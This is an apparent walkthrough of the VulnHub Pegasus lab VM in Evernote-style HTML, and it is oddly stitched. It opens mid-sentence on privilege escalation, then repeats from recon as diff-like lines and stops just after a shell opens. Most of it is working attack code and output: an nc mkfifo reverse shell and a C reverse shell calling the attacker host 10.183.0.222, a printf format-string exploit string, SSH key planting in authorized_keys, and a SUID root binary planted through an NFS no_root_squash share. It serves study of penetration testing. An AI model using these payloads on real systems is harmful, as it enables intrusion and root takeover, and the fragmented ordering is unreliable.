wouldn't be negative</font></div><div>%9$hn             (write lower two bytes to second location, 9 moves down the stack)</div></div><div><br/></div><div>Running the program with our updated exploit string, I confirmed the system command is being called and "Selection:" is being passed in. All that's left to do now is create our reverse shell script, name it "Selection:", and add the current directory to our PATH.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5434 &gt;/tmp/f" &gt; Selection\:</div><div>mike@pegasus:~$ chmod +x Selection\: </div><div>mike@pegasus:~$ export PATH=.:$PATH</div><div>mike@pegasus:~$ python -c 'print "1\n0\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%36952x%8$hn%44966x%9$hn"' | ./my_first</div></div><div><br/></div><div>When we pass our malicious printf string to the program, we get a new shell session in Metasploit as (effective user) john...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 10 opened (10.183.0.222:5434 -&gt; 10.183.0.210:34936) at 2019-05-07 17:53:53 -0400</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions 10</div><div>[*] Starting interaction with 10...</div><div><div><br/></div></div><div>pwd</div><div>/home/mike</div><div>$ id</div><div>uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)</div></div><div><br/></div><div>From here, we can add our SSH keys to /home/john/.ssh/authorized_keys and SSH in as john.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>$ cd /home/john/.ssh</div><div>$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKy7yNAa7Fw0mpUBX001tM69yRSjEgFvirEj9b0lsgSrHq2/qqqXFxN7JUaWn3pcwq8BoBgTAMeNQUzbO/Ph5qh1LmsHD6l3j6Vrs7OiUtnvFIbRIv35Rm+8a0fW3tU3+vxH3gVX+EyfG6QanPBfoAz1Gl6ZkPIdzw1CDiTUAWGvOOiBmOzay4aXOzNv+1S5FyjaxTUv6YZDMCq22MI6k2cZz76uUNQbupKhqvfucJecImu3eaWqRxuBLVBXlrMFqIwGEVIzqt/xRNfg61Krf//Qxi7tjv7okSin5MPu37+JIH0b3fKmuBQKJ2UersPwjVV+rgn02F2xSbvogIYbB7 root@kali" &gt;&gt; authorized_keys</div><div>$ chmod 600 authorized_keys</div></div><div><br/></div><div>Then, from our attacking machine...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# ssh -i pegasus john@10.183.0.210</div><div>Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</div><div><div><br/></div></div><div> * Documentation:  https://help.ubuntu.com/</div><div><div><br/></div></div><div>  System information as of Wed May  8 08:06:30 AEST 2019</div><div><div><br/></div></div><div>  System load:  0.0               Processes:           100</div><div>  Usage of /:   8.5% of 18.32GB   Users logged in:     2</div><div>  Memory usage: 17%               IP address for eth0: 10.183.0.210</div><div>  Swap usage:   0%</div><div><div><br/></div></div><div>  Graph this data and manage this system at:</div><div>    https://landscape.canonical.com/</div><div><div><br/></div></div><div>150 packages can be updated.</div><div>124 updates are security updates.</div><div><div><br/></div></div><div>New release '14.04.6 LTS' available.</div><div>Run 'do-release-upgrade' to upgrade to it.</div><div><div><br/></div><div><br/></div></div><div>Your Hardware Enablement Stack (HWE) is supported until April 2017.</div><div><div><br/></div></div><div>Last login: Wed May  8 08:00:51 2019 from kali.homenet.dom</div><div>john@pegasus:~$</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">pwndbg</span></div><div><br/></div><div>While working on exploiting the 'my_first' binary, I came across the GDB plug-in pwndbg. Apparently it is a more modern implementation of many of the features of peda (refer to IMF notes on peda).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>git clone https://github.com/pwndbg/pwndbg</div><div>cd pwndbg</div><div>./setup.sh</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Escalating from john's account</span></div><div><br/></div><div>We were able to get root pretty easily with the overlays exploit. Here's how we could have gotten root after moving from mike to john's account.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>john@pegasus:~$ sudo -l</div><div>Matching Defaults entries for john on this host:</div><div>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</div><div><div><br/></div></div><div>User john may run the following commands on this host:</div><div>    (root) NOPASSWD: /usr/local/sbin/nfs</div></div><div><br/></div><div>The user john has the ability to start the nfs service without requiring a password. The user doesn't have permission to edit /etc/exports...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>john@pegasus:~$ ls -l /etc/exports</div><div>-rw-r--r-- 1 root root 450 Nov 18  2014 /etc/exports</div></div><div><br/></div><div>...but the file's configuration is already vulnerable (it does not root_squash), so we should be good to go.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>john@pegasus:~$ cat /etc/exports</div><div># /etc/exports: the access control list for filesystems which may be exported</div><div>#               to NFS clients.  See exports(5).</div><div>#</div><div># Example for NFSv2 and NFSv3:</div><div># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</div><div>#</div><div># Example for NFSv4:</div><div># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</div><div># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</div><div>#</div><div>/opt/nfs        *(rw,sync,crossmnt,no_subtree_check,no_root_squash)</div></div><div><br/></div><div>We'll go ahead and start the nfs service...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>john@pegasus:~$ sudo /usr/local/sbin/nfs start </div><div> * Exporting directories for NFS kernel daemon...</div><div>   ...done.</div><div> * Starting NFS kernel daemon</div><div>   ...done.</div><div>john@pegasus:~$ showmount -e</div><div>Export list for pegasus:</div><div>/opt/nfs *</div></div><div><br/></div><div>Interestingly, the /opt/nfs can't be written to except by root...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>drwxr-xr-x 2 root root 4096 Nov 18  2014 nfs</div></div><div><br/></div><div>...so we'll mount the share on our attacking machine where we are root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# mkdir nfs</div><div>root@kali:~/Walkthroughs/pegasus# mount -t nfs 10.183.0.210:/opt/nfs nfs</div></div><div><br/></div><div>We'll create a little application to run bash as root and compile it for the 32-bit victim and SUID root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus/nfs# cat getroot.c </div><div>#include &lt;unistd.h&gt;</div><div><div><br/></div></div><div>main( int argc, char ** argv, char ** envp )</div><div>{</div><div>    setgid(0);</div><div>    setuid(0);</div><div>    system("/bin/bash", argv, envp);</div><div>    return 0;</div><div>}</div><div>root@kali:~/Walkthroughs/pegasus/nfs# gcc -o getroot -m32 getroot.c </div><div>getroot.c:3:1: warning: return type defaults to 'int' [-Wimplicit-int]</div><div> main( int argc, char ** argv, char ** envp )</div><div> ^~~~</div><div>getroot.c: In function 'main':</div><div>getroot.c:7:5: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]</div><div>     system("/bin/bash", argv, envp);</div><div>     ^~~~~~</div><div><div>root@kali:~/Walkthroughs/pegasus/nfs# chmod u+s getroot</div></div></div><div><br/></div><div>Then, go run it back on the victim...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>john@pegasus:~$ cd /opt/nfs</div><div>john@pegasus:/opt/nfs$ ./getroot</div><div>root@pegasus:/opt/nfs# id</div><div>uid=0(root) gid=0(root) groups=0(root),1000(john)</div></div><div><br/></div><div><br/></div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/pegasus-1,109/" target="_blank">https://www.vulnhub.com/entry/pegasus-1,109/</a></div>
+<div>Hostname: pegasus</div>
+<div>IP Address: 10.183.0.210</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.210.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# nmap -Pn -sT -sV -sC -A -oA pegasus -p 1-65535 10.183.0.210</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 15:45 EDT</div>
+    <div>Nmap scan report for pegasus.homenet.dom (10.183.0.210)</div>
+    <div>Host is up (0.0011s latency).</div>
+    <div>Not shown: 65531 closed ports</div>
+    <div>PORT      STATE SERVICE VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open  ssh     </font>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 5.9p1</font>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>| ssh-hostkey: </div>
+    <div>|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)</div>
+    <div>|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)</div>
+    <div>|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind 2-4 (RPC #100000)</font>
+    </div>
+    <div>| rpcinfo: </div>
+    <div>|   program version   port/proto  service</div>
+    <div>|   100000  2,3,4        111/tcp  rpcbind</div>
+    <div>|   100000  2,3,4        111/udp  rpcbind</div>
+    <div>|   100024  1          35622/udp  status</div>
+    <div>|_  100024  1          58473/tcp  status</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">8088/tcp  open  http    nginx 1.1.19</font>
+    </div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">nginx/1.1.19</font>
+    </div>
+    <div>|_http-title: Pegasus Technologies - Under Construction</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">58473/tcp open  status  1 (RPC #100024)</font>
+    </div>
+    <div>MAC Address: 08:00:27:88:F8:40 (Oracle VirtualBox virtual NIC)</div>
+    <div>Device type: general purpose</div>
+    <div>Running: Linux 3.X|4.X</div>
+    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+    <div>OS details: Linux 3.2 - 4.9</div>
+    <div>Network Distance: 1 hop</div>
+    <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   1.14 ms pegasus.homenet.dom (10.183.0.210)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>We don't typically see RPC services open, so I'll take a brief look at what's going on there first.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# rpcinfo -p 10.183.0.210</div>
+    <div>   program vers proto   port  service</div>
+    <div>    100000    4   tcp    111  portmapper</div>
+    <div>    100000    3   tcp    111  portmapper</div>
+    <div>    100000    2   tcp    111  portmapper</div>
+    <div>    100000    4   udp    111  portmapper</div>
+    <div>    100000    3   udp    111  portmapper</div>
+    <div>    100000    2   udp    111  portmapper</div>
+    <div>    100024    1   udp  35622  status</div>
+    <div>    100024    1   tcp  58473  status</div>
+</div>
+<div><br /></div>
+<div>Checking the available services, we only really have the 'status' (rpc.statd) service available. There are some known remote code issues with this service. Checking the exploit database for exploit code, we actually have three options.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Conectiva 4.x/5.x / Debian 2.x / RedHat 6.x / S.u.S.E 6.x/7.0 / Trustix 1.x - rpc.statd Remote Format String | exploits/linux/remote/20075.c</div>
+    <div>Conectiva 4.x/5.x / Debian 2.x / RedHat 6.x / S.u.S.E 6.x/7.0 / Trustix 1.x - rpc.statd Remote Format String | exploits/linux/remote/20076.c</div>
+    <div>Conectiva 4.x/5.x / Debian 2.x / RedHat 6.x / S.u.S.E 6.x/7.0 / Trustix 1.x - rpc.statd Remote Format String | exploits/linux/remote/20077.c</div>
+</div>
+<div><br /></div>
+<div>Before just throwing exploit code at the service, I'll see if I can get in another way, verify the version of nfs-utils running and then maybe use this for privilege escalation.</div>
+<div><br /></div>
+<div>The version of nginx in use (nginx/1.1.19) doesn't have any known vulnerabilities.</div>
+<div><br /></div>
+<div>We'll start some of our typical recon steps (run nikto, run dirb/wfuzz, check robots.txt, check HTTP methods, etc) on the service.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -z file,/usr/share/wordlists/dirb/extensions_common.txt -t 30 --hh 16,189 http://10.183.0.210:8088/FUZZFUZ2Z</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>********************************************************</div>
+    <div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div>
+    <div>********************************************************</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Target: http://10.183.0.210:8088/FUZZFUZ2Z</div>
+    <div>Total requests: 593601</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>==================================================================</div>
+    <div>ID   Response   Lines      Word         Chars          Payload</div>
+    <div>==================================================================</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>181337:  C=403      7 L       10 W          169 Ch        "doc - /"</div>
+    <div>503750:  C=200      0 L        4 W           19 Ch        "submit - .php"</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Total time: 768.9646</div>
+    <div>Processed Requests: 593601</div>
+    <div>Filtered Requests: 593599</div>
+    <div>Requests/sec.: 771.9483</div>
+</div>
+<div><br /></div>
+<div>Browsing directly to the submit.php page, we receive a "No data to process." message.</div>
+<div><br /></div>
+<div>Manually checking supported HTTP methods, I only got back a unique response for the PUT method (standard error).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# curl -X PUT --url http://10.183.0.210:8088/submit.php</div>
+    <div>&lt;html&gt;</div>
+    <div>&lt;head&gt;&lt;title&gt;411 Length Required&lt;/title&gt;&lt;/head&gt;</div>
+    <div>&lt;body bgcolor="white"&gt;</div>
+    <div>&lt;center&gt;&lt;h1&gt;411 Length Required&lt;/h1&gt;&lt;/center&gt;</div>
+    <div>&lt;hr&gt;&lt;center&gt;nginx/1.1.19&lt;/center&gt;</div>
+    <div>&lt;/body&gt;</div>
+    <div>&lt;/html&gt;</div>
+</div>
+<div><br /></div>
+<div>I decided to try to use wfuzz to see if I could find a valid "parameter" (or get any kind of response besides "No data to process.".</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -t 30 --hh 19 -d "FUZZ=test" http://10.183.0.210:8088/submit.php</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>********************************************************</div>
+    <div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div>
+    <div>********************************************************</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Target: http://10.183.0.210:8088/submit.php</div>
+    <div>Total requests: 20469</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>==================================================================</div>
+    <div>ID   Response   Lines      Word         Chars          Payload    </div>
+    <div>==================================================================</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>004830:  C=200      0 L        3 W           16 Ch        "code"</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Total time: 30.52888</div>
+    <div>Processed Requests: 20469</div>
+    <div>Filtered Requests: 20468</div>
+    <div>Requests/sec.: 670.4797</div>
+</div>
+<div><br /></div>
+<div>Nice! Apparently "code" is a valid parameter I can submit. Let's see what the response is.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# curl -X POST -d 'code=test' --url http://10.183.0.210:8088/submit.php</div>
+    <div>Sent for review!</div>
+</div>
+<div><br /></div>
+<div>Well, "Sent for review!" isn't much better than "No data to process.", but at least we are getting somewhere. Based on the response, I'm thinking "code" is like source code and not some kind of numeric passcode. I'll try to send it some PHP code and see what happens.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# curl -X POST -d 'code=echo system($_GET["cmd"]);' --url http://10.183.0.210:8088/submit.php</div>
+    <div>Sorry, due to security precautions, Mike won't review any code containing system() function call.</div>
+</div>
+<div><br /></div>
+<div>Interesting.</div>
+<div><br /></div>
+<div>I wondered if there was a page where the code was reviewed, so I started manually checking some PHP file names. I tried review.php, got nothing. I tried codereview.php and got this...</div>
+<div><br /></div>
+<div><a href="http://10.183.0.210:8088/codereview.php">http://10.183.0.210:8088/codereview.php</a></div>
+<div><br /></div>
+<div><img height="1094" src="/assets/images/2019-05-06-pegasus-1/BFE27D4A-AE80-4374-B091-ABF1BFBFFD9E.png" width="1742" /><br /></div>
+<div><br /></div>
+<div>Checking the source, and sure enough, this is the form that submits to submit.php. It'd be nice to know where these code submissions are getting saved for later review. It would also be nice to know what kind of "code" we are talking about. The assumption is PHP code, but really, it could be anything.</div>
+<div><br /></div>
+<div>I tried submitting a base64 encoded PHP reverse shell (created with msfvenom), but got nothing.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -e php/base64 -f raw &gt; rev64.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>Found 1 compatible encoders</div>
+    <div>Attempting to encode payload with 1 iterations of php/base64</div>
+    <div>php/base64 succeeded with size 4057 (iteration=0)</div>
+    <div>php/base64 chosen with final size 4057</div>
+    <div>Payload size: 4057 bytes</div>
+</div>
+<div><br /></div>
+<div>I then did some Googling for C code to create a reverse shell, and found the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>#include &lt;stdio.h&gt;</div>
+    <div>#include &lt;stdlib.h&gt;</div>
+    <div>#include &lt;string.h&gt;</div>
+    <div>#include &lt;unistd.h&gt;</div>
+    <div>#include &lt;sys/types.h&gt;</div>
+    <div>#include &lt;sys/socket.h&gt;</div>
+    <div>#include &lt;netinet/in.h&gt;</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>int main(void) {</div>
+    <div>    int sockfd;         </div>
+    <div>    int lportno = 5432;    </div>
+    <div>    struct sockaddr_in serv_addr;</div>
+    <div>    char *const params[] = {"/bin/sh",NULL};</div>
+    <div>    char *const environ[] = {NULL};</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</div>
+    <div>    serv_addr.sin_family = AF_INET;</div>
+    <div>    serv_addr.sin_addr.s_addr = inet_addr("10.183.0.222");</div>
+    <div>    serv_addr.sin_port = htons(lportno);  </div>
+    <div>    connect(sockfd, (struct sockaddr *) &amp;serv_addr, 16);</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>    dup2(sockfd,0);</div>
+    <div>    dup2(0,1);</div>
+    <div>    dup2(0,2);</div>
+    <div>    execve("/bin/sh",params,environ);</div>
+    <div>}</div>
+</div>
+<div><br /></div>
+<div>I fired up my listener in Metasploit...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+    <div>LPORT =&gt; 5432</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 3.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5432</div>
+</div>
+<div><br /></div>
+<div>Then submitted the C code...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.210:46819) at 2019-05-06 18:34:33 -0400</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/home/mike</div>
